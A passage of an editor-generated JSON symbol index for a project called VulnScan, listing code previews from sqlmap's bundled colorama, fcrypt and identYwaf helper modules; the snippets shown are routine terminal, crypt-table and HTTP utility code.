        "peekOfCode": "def code_to_chars(code):\n    return CSI + str(code) + 'm'\ndef set_title(title):\n    return OSC + '2;' + title + BEL\ndef clear_screen(mode=2):\n    return CSI + str(mode) + 'J'\ndef clear_line(mode=2):\n    return CSI + str(mode) + 'K'\nclass AnsiCodes(object):\n    def __init__(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "set_title",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "peekOfCode": "def set_title(title):\n    return OSC + '2;' + title + BEL\ndef clear_screen(mode=2):\n    return CSI + str(mode) + 'J'\ndef clear_line(mode=2):\n    return CSI + str(mode) + 'K'\nclass AnsiCodes(object):\n    def __init__(self):\n        # the subclasses declare class attributes which are numbers.\n        # Upon instantiation we define instance attributes, which are the same",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "clear_screen",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "peekOfCode": "def clear_screen(mode=2):\n    return CSI + str(mode) + 'J'\ndef clear_line(mode=2):\n    return CSI + str(mode) + 'K'\nclass AnsiCodes(object):\n    def __init__(self):\n        # the subclasses declare class attributes which are numbers.\n        # Upon instantiation we define instance attributes, which are the same\n        # as the class attributes but wrapped with the ANSI escape sequence\n        for name in dir(self):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "clear_line",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "peekOfCode": "def clear_line(mode=2):\n    return CSI + str(mode) + 'K'\nclass AnsiCodes(object):\n    def __init__(self):\n        # the subclasses declare class attributes which are numbers.\n        # Upon instantiation we define instance attributes, which are the same\n        # as the class attributes but wrapped with the ANSI escape sequence\n        for name in dir(self):\n            if not name.startswith('_'):\n                value = getattr(self, name)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "CSI",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "peekOfCode": "CSI = '\\033['\nOSC = '\\033]'\nBEL = '\\007'\ndef code_to_chars(code):\n    return CSI + str(code) + 'm'\ndef set_title(title):\n    return OSC + '2;' + title + BEL\ndef clear_screen(mode=2):\n    return CSI + str(mode) + 'J'\ndef clear_line(mode=2):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "OSC",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "peekOfCode": "OSC = '\\033]'\nBEL = '\\007'\ndef code_to_chars(code):\n    return CSI + str(code) + 'm'\ndef set_title(title):\n    return OSC + '2;' + title + BEL\ndef clear_screen(mode=2):\n    return CSI + str(mode) + 'J'\ndef clear_line(mode=2):\n    return CSI + str(mode) + 'K'",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "BEL",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "peekOfCode": "BEL = '\\007'\ndef code_to_chars(code):\n    return CSI + str(code) + 'm'\ndef set_title(title):\n    return OSC + '2;' + title + BEL\ndef clear_screen(mode=2):\n    return CSI + str(mode) + 'J'\ndef clear_line(mode=2):\n    return CSI + str(mode) + 'K'\nclass AnsiCodes(object):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "Cursor",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "peekOfCode": "Cursor = AnsiCursor()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansi",
        "documentation": {}
    },
    {
        "label": "StreamWrapper",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "peekOfCode": "class StreamWrapper(object):\n    '''\n    Wraps a stream (such as stdout), acting as a transparent proxy for all\n    attribute access apart from method 'write()', which is delegated to our\n    Converter instance.\n    '''\n    def __init__(self, wrapped, converter):\n        # double-underscore everything to prevent clashes with names of\n        # attributes on the wrapped stream object.\n        self.__wrapped = wrapped",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "documentation": {}
    },
    {
        "label": "AnsiToWin32",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "peekOfCode": "class AnsiToWin32(object):\n    '''\n    Implements a 'write()' method which, on Windows, will strip ANSI character\n    sequences from the text, and if outputting to a tty, will convert them into\n    win32 function calls.\n    '''\n    ANSI_CSI_RE = re.compile('\\001?\\033\\\\[((?:\\\\d|;)*)([a-zA-Z])\\002?')     # Control Sequence Introducer\n    ANSI_OSC_RE = re.compile('\\001?\\033\\\\]([^\\a]*)(\\a)\\002?')               # Operating System Command (Note: https://github.com/tartley/colorama/issues/247)\n    def __init__(self, wrapped, convert=None, strip=None, autoreset=False):\n        # The wrapped stream (normally sys.stdout or sys.stderr)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "documentation": {}
    },
    {
        "label": "is_stream_closed",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "peekOfCode": "def is_stream_closed(stream):\n    return not hasattr(stream, 'closed') or stream.closed\ndef is_a_tty(stream):\n    return hasattr(stream, 'isatty') and stream.isatty()\nclass StreamWrapper(object):\n    '''\n    Wraps a stream (such as stdout), acting as a transparent proxy for all\n    attribute access apart from method 'write()', which is delegated to our\n    Converter instance.\n    '''",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "documentation": {}
    },
    {
        "label": "is_a_tty",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "peekOfCode": "def is_a_tty(stream):\n    return hasattr(stream, 'isatty') and stream.isatty()\nclass StreamWrapper(object):\n    '''\n    Wraps a stream (such as stdout), acting as a transparent proxy for all\n    attribute access apart from method 'write()', which is delegated to our\n    Converter instance.\n    '''\n    def __init__(self, wrapped, converter):\n        # double-underscore everything to prevent clashes with names of",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "documentation": {}
    },
    {
        "label": "winterm",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "peekOfCode": "winterm = None\nif windll is not None:\n    winterm = WinTerm()\ndef is_stream_closed(stream):\n    return not hasattr(stream, 'closed') or stream.closed\ndef is_a_tty(stream):\n    return hasattr(stream, 'isatty') and stream.isatty()\nclass StreamWrapper(object):\n    '''\n    Wraps a stream (such as stdout), acting as a transparent proxy for all",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.ansitowin32",
        "documentation": {}
    },
    {
        "label": "reset_all",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "peekOfCode": "def reset_all():\n    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit\n        AnsiToWin32(orig_stdout).reset_all()\ndef init(autoreset=False, convert=None, strip=None, wrap=True):\n    global wrapped_stdout, wrapped_stderr\n    global orig_stdout, orig_stderr\n    if orig_stdout is not None:\n        return\n    if not wrap and any([autoreset, convert, strip]):\n        raise ValueError('wrap=False conflicts with any other arg=True')",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "init",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "peekOfCode": "def init(autoreset=False, convert=None, strip=None, wrap=True):\n    global wrapped_stdout, wrapped_stderr\n    global orig_stdout, orig_stderr\n    if orig_stdout is not None:\n        return\n    if not wrap and any([autoreset, convert, strip]):\n        raise ValueError('wrap=False conflicts with any other arg=True')\n    orig_stdout = sys.stdout\n    orig_stderr = sys.stderr\n    if sys.stdout is None:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "deinit",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "peekOfCode": "def deinit():\n    global orig_stdout\n    global orig_stderr\n    if orig_stdout is not None:\n        sys.stdout = orig_stdout\n        orig_stdout = None\n    if orig_stderr is not None:\n        sys.stderr = orig_stderr\n        orig_stderr = None\n@contextlib.contextmanager",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "colorama_text",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "peekOfCode": "def colorama_text(*args, **kwargs):\n    init(*args, **kwargs)\n    try:\n        yield\n    finally:\n        deinit()\ndef reinit():\n    if wrapped_stdout is not None:\n        sys.stdout = wrapped_stdout\n    if wrapped_stderr is not None:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "reinit",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "peekOfCode": "def reinit():\n    if wrapped_stdout is not None:\n        sys.stdout = wrapped_stdout\n    if wrapped_stderr is not None:\n        sys.stderr = wrapped_stderr\ndef wrap_stream(stream, convert, strip, autoreset, wrap):\n    if wrap:\n        wrapper = AnsiToWin32(stream,\n            convert=convert, strip=strip, autoreset=autoreset)\n        if wrapper.should_wrap():",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "wrap_stream",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "peekOfCode": "def wrap_stream(stream, convert, strip, autoreset, wrap):\n    if wrap:\n        wrapper = AnsiToWin32(stream,\n            convert=convert, strip=strip, autoreset=autoreset)\n        if wrapper.should_wrap():\n            stream = wrapper.stream\n    return stream",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "orig_stdout",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "peekOfCode": "orig_stdout = None\norig_stderr = None\nwrapped_stdout = None\nwrapped_stderr = None\natexit_done = False\ndef reset_all():\n    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit\n        AnsiToWin32(orig_stdout).reset_all()\ndef init(autoreset=False, convert=None, strip=None, wrap=True):\n    global wrapped_stdout, wrapped_stderr",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "orig_stderr",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "peekOfCode": "orig_stderr = None\nwrapped_stdout = None\nwrapped_stderr = None\natexit_done = False\ndef reset_all():\n    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit\n        AnsiToWin32(orig_stdout).reset_all()\ndef init(autoreset=False, convert=None, strip=None, wrap=True):\n    global wrapped_stdout, wrapped_stderr\n    global orig_stdout, orig_stderr",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "wrapped_stdout",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "peekOfCode": "wrapped_stdout = None\nwrapped_stderr = None\natexit_done = False\ndef reset_all():\n    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit\n        AnsiToWin32(orig_stdout).reset_all()\ndef init(autoreset=False, convert=None, strip=None, wrap=True):\n    global wrapped_stdout, wrapped_stderr\n    global orig_stdout, orig_stderr\n    if orig_stdout is not None:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "wrapped_stderr",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "peekOfCode": "wrapped_stderr = None\natexit_done = False\ndef reset_all():\n    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit\n        AnsiToWin32(orig_stdout).reset_all()\ndef init(autoreset=False, convert=None, strip=None, wrap=True):\n    global wrapped_stdout, wrapped_stderr\n    global orig_stdout, orig_stderr\n    if orig_stdout is not None:\n        return",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "atexit_done",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "peekOfCode": "atexit_done = False\ndef reset_all():\n    if AnsiToWin32 is not None:    # Issue #74: objects might become None at exit\n        AnsiToWin32(orig_stdout).reset_all()\ndef init(autoreset=False, convert=None, strip=None, wrap=True):\n    global wrapped_stdout, wrapped_stderr\n    global orig_stdout, orig_stderr\n    if orig_stdout is not None:\n        return\n    if not wrap and any([autoreset, convert, strip]):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.initialise",
        "documentation": {}
    },
    {
        "label": "STDOUT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.win32",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.win32",
        "peekOfCode": "STDOUT = -11\nSTDERR = -12\ntry:\n    import ctypes\n    from ctypes import LibraryLoader\n    windll = LibraryLoader(ctypes.WinDLL)\n    from ctypes import wintypes\nexcept (AttributeError, ImportError):\n    windll = None\n    SetConsoleTextAttribute = lambda *_: None",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.win32",
        "documentation": {}
    },
    {
        "label": "STDERR",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.win32",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.win32",
        "peekOfCode": "STDERR = -12\ntry:\n    import ctypes\n    from ctypes import LibraryLoader\n    windll = LibraryLoader(ctypes.WinDLL)\n    from ctypes import wintypes\nexcept (AttributeError, ImportError):\n    windll = None\n    SetConsoleTextAttribute = lambda *_: None\n    winapi_test = lambda *_: None",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.win32",
        "documentation": {}
    },
    {
        "label": "WinColor",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.winterm",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.winterm",
        "peekOfCode": "class WinColor(object):\n    BLACK   = 0\n    BLUE    = 1\n    GREEN   = 2\n    CYAN    = 3\n    RED     = 4\n    MAGENTA = 5\n    YELLOW  = 6\n    GREY    = 7\n# from wincon.h",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.winterm",
        "documentation": {}
    },
    {
        "label": "WinStyle",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.winterm",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.winterm",
        "peekOfCode": "class WinStyle(object):\n    NORMAL              = 0x00 # dim text, dim background\n    BRIGHT              = 0x08 # bright text, dim background\n    BRIGHT_BACKGROUND   = 0x80 # dim text, bright background\nclass WinTerm(object):\n    def __init__(self):\n        self._default = win32.GetConsoleScreenBufferInfo(win32.STDOUT).wAttributes\n        self.set_attrs(self._default)\n        self._default_fore = self._fore\n        self._default_back = self._back",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.winterm",
        "documentation": {}
    },
    {
        "label": "WinTerm",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.colorama.winterm",
        "description": "VulnScan.modules.sqlmap.thirdparty.colorama.winterm",
        "peekOfCode": "class WinTerm(object):\n    def __init__(self):\n        self._default = win32.GetConsoleScreenBufferInfo(win32.STDOUT).wAttributes\n        self.set_attrs(self._default)\n        self._default_fore = self._fore\n        self._default_back = self._back\n        self._default_style = self._style\n        # In order to emulate LIGHT_EX in windows, we borrow the BRIGHT style.\n        # So that LIGHT_EX colors and BRIGHT style do not clobber each other,\n        # we track them separately, since LIGHT_EX is overwritten by Fore/Back",
        "detail": "VulnScan.modules.sqlmap.thirdparty.colorama.winterm",
        "documentation": {}
    },
    {
        "label": "crypt",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "description": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "peekOfCode": "def crypt(password, salt):\n    \"\"\"Generate an encrypted hash from the passed password.  If the password\nis longer than eight characters, only the first eight will be used.\nThe first two characters of the salt are used to modify the encryption\nalgorithm used to generate in the hash in one of 4096 different ways.\nThe characters for the salt should be upper- and lower-case letters A\nto Z, digits 0 to 9, '.' and '/'.\nThe returned hash begins with the two characters of the salt, and\nshould be passed as the salt to verify the password.\nExample:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "documentation": {}
    },
    {
        "label": "__author__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "description": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "peekOfCode": "__author__ = 'Carey Evans <careye@spamcop.net>'\n__version__ = '1.3.1'\n__date__ = '21 February 2004'\n__credits__ = '''michal j wallace for inspiring me to write this.\nEric Young for the C code this module was copied from.'''\n__all__ = ['crypt']\n# Copyright (C) 2000, 2001, 2004  Carey Evans  <careye@spamcop.net>\n#\n# Permission to use, copy, modify, and distribute this software and\n# its documentation for any purpose and without fee is hereby granted,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "documentation": {}
    },
    {
        "label": "__version__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "description": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "peekOfCode": "__version__ = '1.3.1'\n__date__ = '21 February 2004'\n__credits__ = '''michal j wallace for inspiring me to write this.\nEric Young for the C code this module was copied from.'''\n__all__ = ['crypt']\n# Copyright (C) 2000, 2001, 2004  Carey Evans  <careye@spamcop.net>\n#\n# Permission to use, copy, modify, and distribute this software and\n# its documentation for any purpose and without fee is hereby granted,\n# provided that the above copyright notice appear in all copies and",
        "detail": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "documentation": {}
    },
    {
        "label": "__date__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "description": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "peekOfCode": "__date__ = '21 February 2004'\n__credits__ = '''michal j wallace for inspiring me to write this.\nEric Young for the C code this module was copied from.'''\n__all__ = ['crypt']\n# Copyright (C) 2000, 2001, 2004  Carey Evans  <careye@spamcop.net>\n#\n# Permission to use, copy, modify, and distribute this software and\n# its documentation for any purpose and without fee is hereby granted,\n# provided that the above copyright notice appear in all copies and\n# that both that copyright notice and this permission notice appear in",
        "detail": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "documentation": {}
    },
    {
        "label": "__credits__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "description": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "peekOfCode": "__credits__ = '''michal j wallace for inspiring me to write this.\nEric Young for the C code this module was copied from.'''\n__all__ = ['crypt']\n# Copyright (C) 2000, 2001, 2004  Carey Evans  <careye@spamcop.net>\n#\n# Permission to use, copy, modify, and distribute this software and\n# its documentation for any purpose and without fee is hereby granted,\n# provided that the above copyright notice appear in all copies and\n# that both that copyright notice and this permission notice appear in\n# supporting documentation.",
        "detail": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "documentation": {}
    },
    {
        "label": "__all__",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "description": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "peekOfCode": "__all__ = ['crypt']\n# Copyright (C) 2000, 2001, 2004  Carey Evans  <careye@spamcop.net>\n#\n# Permission to use, copy, modify, and distribute this software and\n# its documentation for any purpose and without fee is hereby granted,\n# provided that the above copyright notice appear in all copies and\n# that both that copyright notice and this permission notice appear in\n# supporting documentation.\n#\n# CAREY EVANS DISCLAIMS ALL WARRANTIES WITH REGARD TO THIS SOFTWARE,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "documentation": {}
    },
    {
        "label": "_ITERATIONS",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "description": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "peekOfCode": "_ITERATIONS = 16\n_SPtrans = (\n    # nibble 0\n    [ 0x00820200, 0x00020000, 0x80800000, 0x80820200,\n      0x00800000, 0x80020200, 0x80020000, 0x80800000,\n      0x80020200, 0x00820200, 0x00820000, 0x80000200,\n      0x80800200, 0x00800000, 0x00000000, 0x80020000,\n      0x00020000, 0x80000000, 0x00800200, 0x00020200,\n      0x80820200, 0x00820000, 0x80000200, 0x00800200,\n      0x80000000, 0x00000200, 0x00020200, 0x80820000,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "documentation": {}
    },
    {
        "label": "_SPtrans",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "description": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "peekOfCode": "_SPtrans = (\n    # nibble 0\n    [ 0x00820200, 0x00020000, 0x80800000, 0x80820200,\n      0x00800000, 0x80020200, 0x80020000, 0x80800000,\n      0x80020200, 0x00820200, 0x00820000, 0x80000200,\n      0x80800200, 0x00800000, 0x00000000, 0x80020000,\n      0x00020000, 0x80000000, 0x00800200, 0x00020200,\n      0x80820200, 0x00820000, 0x80000200, 0x00800200,\n      0x80000000, 0x00000200, 0x00020200, 0x80820000,\n      0x00000200, 0x80800200, 0x80820000, 0x00000000,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "documentation": {}
    },
    {
        "label": "_skb",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "description": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "peekOfCode": "_skb = (\n    # for C bits (numbered as per FIPS 46) 1 2 3 4 5 6\n    [ 0x00000000, 0x00000010, 0x20000000, 0x20000010,\n      0x00010000, 0x00010010, 0x20010000, 0x20010010,\n      0x00000800, 0x00000810, 0x20000800, 0x20000810,\n      0x00010800, 0x00010810, 0x20010800, 0x20010810,\n      0x00000020, 0x00000030, 0x20000020, 0x20000030,\n      0x00010020, 0x00010030, 0x20010020, 0x20010030,\n      0x00000820, 0x00000830, 0x20000820, 0x20000830,\n      0x00010820, 0x00010830, 0x20010820, 0x20010830,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "documentation": {}
    },
    {
        "label": "_shifts2",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "description": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "peekOfCode": "_shifts2 = (0,0,1,1,1,1,1,1,0,1,1,1,1,1,1,0)\n_con_salt = [\n    0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,0xD8,0xD9,\n    0xDA,0xDB,0xDC,0xDD,0xDE,0xDF,0xE0,0xE1,\n    0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,0xE8,0xE9,\n    0xEA,0xEB,0xEC,0xED,0xEE,0xEF,0xF0,0xF1,\n    0xF2,0xF3,0xF4,0xF5,0xF6,0xF7,0xF8,0xF9,\n    0xFA,0xFB,0xFC,0xFD,0xFE,0xFF,0x00,0x01,\n    0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,\n    0x0A,0x0B,0x05,0x06,0x07,0x08,0x09,0x0A,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "documentation": {}
    },
    {
        "label": "_con_salt",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "description": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "peekOfCode": "_con_salt = [\n    0xD2,0xD3,0xD4,0xD5,0xD6,0xD7,0xD8,0xD9,\n    0xDA,0xDB,0xDC,0xDD,0xDE,0xDF,0xE0,0xE1,\n    0xE2,0xE3,0xE4,0xE5,0xE6,0xE7,0xE8,0xE9,\n    0xEA,0xEB,0xEC,0xED,0xEE,0xEF,0xF0,0xF1,\n    0xF2,0xF3,0xF4,0xF5,0xF6,0xF7,0xF8,0xF9,\n    0xFA,0xFB,0xFC,0xFD,0xFE,0xFF,0x00,0x01,\n    0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,\n    0x0A,0x0B,0x05,0x06,0x07,0x08,0x09,0x0A,\n    0x0B,0x0C,0x0D,0x0E,0x0F,0x10,0x11,0x12,",
        "detail": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "documentation": {}
    },
    {
        "label": "_cov_2char",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "description": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "peekOfCode": "_cov_2char = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'\ndef _HPERM_OP(a):\n    \"\"\"Clever bit manipulation.\"\"\"\n    t = ((a << 18) ^ a) & 0xcccc0000\n    return a ^ t ^ ((t >> 18) & 0x3fff)\ndef _PERM_OP(a,b,n,m):\n    \"\"\"Cleverer bit manipulation.\"\"\"\n    t = ((a >> n) ^ b) & m\n    b = b ^ t\n    a = a ^ (t << n)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.fcrypt.fcrypt",
        "documentation": {}
    },
    {
        "label": "exit",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "def exit(message=None):\n    if message:\n        print(\"%s%s\" % (message, ' ' * 20))\n    _exit(1)\ndef retrieve(url, data=None):\n    global proxies_index\n    retval = {}\n    if proxies:\n        while True:\n            try:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "retrieve",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "def retrieve(url, data=None):\n    global proxies_index\n    retval = {}\n    if proxies:\n        while True:\n            try:\n                opener = build_opener(ProxyHandler({\"http\": proxies[proxies_index], \"https\": proxies[proxies_index]}))\n                install_opener(opener)\n                proxies_index = (proxies_index + 1) % len(proxies)\n                urlopen(PROXY_TESTING_PAGE).read()",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "calc_hash",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "peekOfCode": "def calc_hash(value, binary=True):\n    value = value.encode(\"utf8\") if not isinstance(value, bytes) else value\n    result = zlib.crc32(value) & 0xffff\n    if binary:\n        result = struct.pack(\">H\", result)\n    return result\ndef single_print(message):\n    if message not in seen:\n        print(message)\n        seen.add(message)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "documentation": {}
    },
    {
        "label": "single_print",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
        "description": "VulnScan.modules.sqlmap.thirdparty.identywaf.identYwaf",
